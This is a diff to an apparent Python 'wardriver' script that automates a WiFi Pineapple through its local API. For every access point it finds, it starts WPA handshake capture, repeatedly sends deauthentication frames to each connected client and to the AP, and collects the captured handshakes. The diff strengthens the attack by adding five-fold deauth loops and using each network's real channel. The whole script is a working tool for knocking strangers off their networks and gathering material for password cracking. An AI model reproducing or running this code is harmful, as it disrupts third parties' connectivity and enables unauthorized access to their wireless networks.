@@ -1,5 +1,4 @@
 #!/usr/bin/env python3 
-
 #todo: filter for 'Open' networks
 
 import json, requests, time
@@ -55,7 +54,7 @@ def basic_wardriver_flow():
         pineAPSettings["settings"]["logging"] = True
         pineAPSettings["settings"]["connect_notifications"] = False
         pineAPSettings["settings"]["disconnect_notifications"] = False
-        pineAPSettings["settings"]["capture_ssids"] = True
+        pineAPSettings["settings"]["capture_ssids"] = False
         pineAPSettings["settings"]["beacon_responses"] = True
         pineAPSettings["settings"]["broadcast_ssid_pool"] = False
         pineAPSettings["settings"]["pineap_mac"] = "5A:11:B0:A7:A9:09"
@@ -69,6 +68,8 @@ def basic_wardriver_flow():
     print('>sleeping to allow recon list to populate')
     if (continuousScan != True):    
         time.sleep(scanTime)
+    elif (continuousScan and (cycle > 1)):
+        time.sleep(0)
     else:
         time.sleep(90)
     if (continuousScan == False):
@@ -90,30 +91,40 @@ def basic_wardriver_flow():
                 handshakePayload = dict()
                 clientArray = []
                 handshakePayload["bssid"] = ap["bssid"]
+                handshakePayload["channel"] = ap["channel"]
                 print('>starting handshake')
-                s.post("http://172.16.42.1:1471/api/pineap/handshakes/start").json()
+                hsStartResp = s.post("http://172.16.42.1:1471/api/pineap/handshakes/start", json.dumps(handshakePayload)).json()
+                print(hsStartResp)
+                # MAKE SURE THIS STARTED 200
                 for client in ap["clients"]:
                     clientDeauthPayload["bssid"] = client["ap_mac"]
                     clientDeauthPayload["mac"] = client["client_mac"]
                     clientDeauthPayload["multiplier"] = 5
-                    clientDeauthPayload["channel"] = 11
-                    print('>deauthing client: ' +client["client_mac"])
-                    s.post("http://172.16.42.1:1471/api/pineap/deauth/client", json.dumps(clientDeauthPayload)).json()
+                    clientDeauthPayload["channel"] = client["ap_channel"]
+                    for i in range(5):
+                        print('>deauthing client: ' +client["client_mac"]+ ' on ' +client["ap_mac"])
+                        clientDeauthResp = s.post("http://172.16.42.1:1471/api/pineap/deauth/client", json.dumps(clientDeauthPayload)).json()
+                        time.sleep(5)
+                        print(clientDeauthResp)
                     clientArray.append(client["client_mac"])
                 
                 bssidDeauthPayload["bssid"] = ap["bssid"]
                 bssidDeauthPayload["multiplier"] = 5
-                bssidDeauthPayload["channel"] = 11
+                bssidDeauthPayload["channel"] = ap["channel"]
                 bssidDeauthPayload["clients"] = clientArray
-                print('>deauthing AP' +ap["bssid"])
-                s.post("http://172.16.42.1:1471/api/pineap/deauth/ap", json.dumps(bssidDeauthPayload)).json()
+                for i in range(5):
+                    print('>deauthing AP ' +ap["bssid"])
+                    bssidDeauthResp = s.post("http://172.16.42.1:1471/api/pineap/deauth/ap", json.dumps(bssidDeauthPayload)).json()
+                    time.sleep(5)
+                    print(bssidDeauthResp)
                 print('>sleeping to allow handshakes to come in')
-                time.sleep(30)
+                time.sleep(20)
                 print('>stopping handshake')
-                s.post("http://172.16.42.1:1471/api/pineap/handshakes/stop").json()
+                stopHandshakeResp = s.post("http://172.16.42.1:1471/api/pineap/handshakes/stop").json()
+                print(stopHandshakeResp)
                 print('>getting handshake result')
                 handshakesResultResp = s.get("http://172.16.42.1:1471/api/pineap/handshakes").json()
-                
+                print(handshakesResultResp)
                 notificationPayload = dict()
                 notificationPayload["module_name"] = "wardriver"
                 
